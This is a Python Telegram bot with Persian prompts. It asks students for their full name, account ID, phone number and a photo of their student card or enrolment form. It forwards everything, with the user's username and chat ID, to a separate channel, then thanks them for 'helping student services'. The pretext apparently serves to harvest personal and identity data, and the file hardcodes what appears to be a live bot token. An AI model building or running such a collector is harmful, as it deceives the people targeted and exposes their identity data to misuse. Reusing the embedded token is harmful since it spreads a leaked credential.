from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
import logging

# ======= تنظیمات =======
TOKEN = "8476998300:AAGY2UnyUcrhm29IBvg8BYyCXgRxy73GvVY"
CHANNEL_ID = "@alialisend123"  # کانال برای دریافت اطلاعات
FINAL_LINK = "https://t.me/azadborojerd"  # لینک کانال نهایی برای کاربر
# ========================

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# -------------------- /start --------------------
def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "👋 سلام دوست عزیز!\n\nلطفاً *نام و نام خانوادگی* خودت رو برام بفرست 🙏",
        parse_mode="Markdown"
    )

# -------------------- دریافت متن --------------------
def handle_text(update: Update, context: CallbackContext):
    user_data = context.user_data
    user = update.message.from_user

    if "name" not in user_data:
        user_data["name"] = update.message.text
        user_name = user_data["name"].split()[0]  # فقط اسم کوچک
        update.message.reply_text(
            f"📌 عالی {user_name}! لطفاً *آیدی خودت* را وارد کن:",
            parse_mode="Markdown"
        )
    elif "user_id" not in user_data:
        user_data["user_id"] = update.message.text
        update.message.reply_text(
            "📞 خوبه! حالا لطفاً *شماره موبایل* خودت را وارد کن:",
            parse_mode="Markdown"
        )
    elif "phone" not in user_data:
        user_data["phone"] = update.message.text
        update.message.reply_text(
            "🖼️ عالی! حالا لطفاً عکس دانشجویی یا انتخاب واحد خودت را بفرست:",
            parse_mode="Markdown"
        )
    else:
        update.message.reply_text(
            "⚠️ لطفاً عکس دانشجویی یا انتخاب واحد خود را ارسال کنید.",
            parse_mode="Markdown"
        )

# -------------------- دریافت عکس --------------------
def handle_photo(update: Update, context: CallbackContext):
    user_data = context.user_data
    user = update.message.from_user
    try:
        photo_file = update.message.photo[-1].get_file()
        photo_file.download("temp.jpg")

        # ارسال همه اطلاعات + عکس به کانال
        caption = (
            f"👤 نام: {user_data.get('name')}\n"
            f"🆔 آیدی: {user_data.get('user_id')}\n"
            f"📞 شماره: {user_data.get('phone')}\n"
            f"Username: @{user.username if user.username else 'ندارد'}\n"
            f"Chat ID: {update.message.chat_id}"
        )
        context.bot.send_photo(chat_id=CHANNEL_ID, photo=open("temp.jpg", "rb"), caption=caption)

        # دکمه شیشه‌ای برای ثبت نهایی
        keyboard = [[InlineKeyboardButton("✅ ثبت نهایی", callback_data="final_click")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text(
            "🎉 اطلاعات شما ثبت شد! برای ثبت نهایی روی دکمه زیر کلیک کنید:", 
            reply_markup=reply_markup
        )

    except Exception as e:
        logging.error(f"Error sending photo: {e}")
        update.message.reply_text(
            "❌ مشکلی پیش آمد! لطفاً دوباره امتحان کنید.",
            parse_mode="Markdown"
        )

# -------------------- کلیک روی دکمه شیشه‌ای --------------------
def button_click(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    query.message.reply_text(
        f"🙏 ممنون از این که ما را در ارائه خدمات بهتر دانشجویی یاری می‌کنید.\n"
        f"💬 مارا در تریبون دانشگاه آزاد بروجرد دنبال کنید.\n\n"
        f"🎓 لینک کانال: {FINAL_LINK}"
    )
    # پاک کردن داده‌های کاربر
    context.user_data.clear()

# -------------------- main --------------------
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))
    dp.add_handler(MessageHandler(Filters.photo, handle_photo))
    dp.add_handler(CallbackQueryHandler(button_click))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
